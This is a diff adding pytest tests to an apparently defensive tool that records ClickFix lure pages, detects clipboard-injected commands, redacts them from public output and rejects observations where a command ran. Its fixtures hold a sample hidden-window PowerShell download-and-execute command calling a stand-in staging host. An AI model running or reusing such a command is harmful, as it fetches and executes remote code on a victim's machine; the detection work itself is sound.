@@ -3,6 +3,8 @@ from __future__ import annotations
 import importlib.util
 import json
 import sys
+
+import pytest
 from pathlib import Path
 
 
@@ -306,3 +308,123 @@ def test_observation_summary_deduplicates_tls_certificates() -> None:
     summary = target.observation_summary(observation)
 
     assert summary["tls_certificates"] == [certificate]
+
+
+def test_browser_observation_captures_command_without_public_raw_value() -> None:
+    item = _case(
+        "browser.test",
+        "ThreatFox",
+        "browser-1",
+        "2026-07-30 01:00:00 UTC",
+    )
+    raw = {
+        "schema_version": 1,
+        "case_id": item.case_id,
+        "domain": item.domain,
+        "observed_at_utc": "2026-07-30T01:05:00Z",
+        "status": "ok",
+        "policy": {
+            "javascript_executed": True,
+            "clipboard_intercepted": True,
+            "native_clipboard_write_suppressed": True,
+            "command_executed": False,
+            "command_pasted": False,
+            "credentials_sent": False,
+            "form_submitted": False,
+            "payload_opened": False,
+        },
+        "page": {
+            "title": "Verification",
+            "final_url": "https://browser.test/a?token=secret",
+            "lure_markers": ["Verify", "Clipboard"],
+        },
+        "clipboard_events": [
+            {
+                "api": "navigator.clipboard.writeText",
+                "private_value": "powershell -w h -c \"iex(irm 'https://stage.test/a')\"",
+            }
+        ],
+    }
+
+    browser = target.normalize_browser_observation(raw, item)
+    observation = {"landing": [], "stages": [], "browser_observation": browser}
+    summary = target.observation_summary(observation)
+    public = target.public_observation(observation)
+
+    assert summary["browser_attempted"] is True
+    assert summary["browser_javascript_executed"] is True
+    assert summary["browser_clipboard_intercepted"] is True
+    assert summary["browser_clipboard_events"] == 1
+    assert summary["candidate_commands_live"][0]["pattern"] == "powershell_download_execute"
+    assert summary["candidate_commands_live"][0]["stage_urls"] == ["https://stage.test/a"]
+    assert browser["page"]["final_url"]["sanitized"] == "https://browser.test/a"
+    assert "private_value" not in public["browser_observation"]["clipboard_events"][0]
+
+
+def test_browser_observation_rejects_executed_command() -> None:
+    item = _case(
+        "browser.test",
+        "ThreatFox",
+        "browser-2",
+        "2026-07-30 01:00:00 UTC",
+    )
+    raw = {
+        "schema_version": 1,
+        "case_id": item.case_id,
+        "domain": item.domain,
+        "observed_at_utc": "2026-07-30T01:05:00Z",
+        "status": "ok",
+        "policy": {"command_executed": True},
+        "page": {},
+        "clipboard_events": [],
+    }
+
+    with pytest.raises(ValueError, match="禁止されたブラウザ操作"):
+        target.normalize_browser_observation(raw, item)
+
+
+def test_infection_chain_records_supported_stages_and_stop_point() -> None:
+    raw_command = "powershell -w h -c \"iex(irm 'https://stage.test/a')\""
+    item = target.SelectedCase(
+        case_id=target._case_id("2026-07-30", "ThreatFox", "chain-1"),
+        domain="chain.test",
+        observed_at="2026-07-30 01:00:00 UTC",
+        source="ThreatFox",
+        source_id="chain-1",
+        source_url="https://example.test/",
+        tags=("ClickFix",),
+        reported_malware="未確認",
+        confidence=100,
+        raw_command=raw_command,
+    )
+    observation = {
+        "landing": [
+            {
+                "hops": [
+                    {
+                        "status": "ok",
+                        "http_status": 200,
+                        "text_analysis": {
+                            "clipboard_api_observed": True,
+                            "lure_markers": ["verify"],
+                            "candidate_commands": [],
+                        },
+                    }
+                ]
+            }
+        ],
+        "stages": [],
+    }
+    summary = target.observation_summary(observation)
+    command = target.command_profile(raw_command)
+    command["stage_urls"] = ["https://stage.test/a"]
+
+    chain = target.build_infection_chain(item, summary, command)
+    by_phase = {stage["phase_id"]: stage for stage in chain["stages"]}
+    rendered = target.render_infection_chain(chain)
+
+    assert by_phase["CF-01"]["status"] == "observed"
+    assert by_phase["CF-03"]["status"] == "provider_reported"
+    assert by_phase["CF-04"]["status"] == "not_observed"
+    assert "flowchart LR" in rendered
+    assert "CF-03" in rendered
